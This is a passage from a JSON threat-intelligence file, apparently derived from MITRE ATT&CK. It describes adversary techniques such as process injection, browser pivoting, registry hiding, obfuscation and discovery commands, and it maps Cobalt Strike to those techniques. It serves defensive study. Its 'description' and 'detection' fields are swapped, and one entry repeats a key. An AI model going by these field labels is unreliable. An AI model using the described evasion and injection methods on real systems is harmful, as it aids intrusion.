                "detection": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1185",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Man in the Browser",
                "chain_phase": "collection",
                "description": "This is a difficult technique to detect because adversary traffic would be masked by normal user traffic. No new processes are created and no additional software touches disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for process injection against browser applications.",
                "detection": "Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. \n\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet.  \n\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. ",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1140",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Deobfuscate/Decode Files or Information",
                "chain_phase": "defense-evasion",
                "description": "Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.",
                "detection": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file.  Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. \n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1135",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Network Share Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.",
                "is_subtype": false,
                "platforms": [
                    "macOS",
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1113",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Screen Capture",
                "chain_phase": "collection",
                "description": "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.",
                "detection": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.\n",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1112",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Modify Registry",
                "chain_phase": "defense-evasion",
                "description": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",
                "detection": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1106",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Native API",
                "chain_phase": "execution",
                "description": "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows API may involve processes loading/accessing system DLLs associated with providing called functions (ex: kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. ",
                "detection": "Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nFunctionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may abuse these native API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1105",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Ingress Tool Transfer",
                "chain_phase": "command-and-control",
                "description": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1095",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Non-Application Layer Protocol",
                "chain_phase": "command-and-control",
                "description": "Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) \n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.",
                "detection": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts;  however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Network"
                ]
            }
        },
        {
            "id": "T1071",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Application Layer Protocol",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1068",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Exploitation for Privilege Escalation",
                "chain_phase": "privilege-escalation",
                "description": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.(Citation: Microsoft Driver Block Rules)\n\nHigher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.",
                "detection": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1057",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Process Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Process Injection",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1049",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "System Network Connections Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\".",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1047",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Windows Management Instrumentation",
                "chain_phase": "execution",
                "description": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)",
                "detection": "Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB)  and Remote Procedure Call Service (RPCS)  for remote access. RPCS operates over port 135. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.  ",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1043",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Commonly Used Port",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "**This technique has been deprecated. Please use Non-Standard Port where appropriate.**\n\nAdversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1029",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Scheduled Transfer",
                "chain_phase": "exfiltration",
                "description": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.",
                "detection": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1027",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Obfuscated Files or Information",
                "chain_phase": "defense-evasion",
                "description": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
                "detection": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1026",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Multiband Communication",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) Correlating alerts between multiple communication channels can further help identify command-and-control behavior.",
                "detection": "**This technique has been deprecated and should no longer be used.**\n\nSome adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1012",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Query Registry",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1005",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Data from Local System",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd, which has functionality to interact with the file system to gather information. Some adversaries may also use Automated Collection on the local system.\n",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0154",
            "type": "tool",
            "attributes": {
                "name": "Cobalt Strike",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Cobalt Strike is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.\n\nIn addition to its own capabilities, Cobalt Strike leverages the capabilities of other well-known tools such as Metasploit and Mimikatz.",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 60,
            "techniques": [
                "T1012",
                "T1021.002",
                "T1047",
                "T1548.002",
                "T1137.001",
                "T1026",
                "T1029",
                "T1078.003",
                "T1027.005",
                "T1090.001",
                "T1134.003",
                "T1140",
                "T1059.006",
                "T1059.005",
                "T1068",
                "T1134.004",
                "T1573.001",
                "T1203",
                "T1113",
                "T1112",
                "T1055",
                "T1021.004",
                "T1016",
                "T1056.001",
                "T1055.012",
                "T1071",
                "T1003.002",
                "T1021.006",
                "T1185",
                "T1135",
                "T1095",
                "T1573.002",
                "T1071.004",
                "T1572",
                "T1569.002",
                "T1543.003",
                "T1059.001",
                "T1106",
                "T1070.006",
                "T1087.002",
                "T1071.001",
                "T1553.002",
                "T1550.002",
                "T1055.001",
                "T1197",
                "T1057",
                "T1562.001",
                "T1043",
                "T1105",
                "T1021.003",
                "T1046",
                "T1027",
                "T1049",
                "T1005",
                "T1078.002",
                "T1134.001",
                "T1021.001",
                "T1059.003",
                "T1059.007",
                "T1018"
            ]
        },
        {
            "id": "T1127.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "MSBuild",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.",
                "detection": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1102.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Dead Drop Resolver",
                "chain_phase": "command-and-control",
                "description": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)",
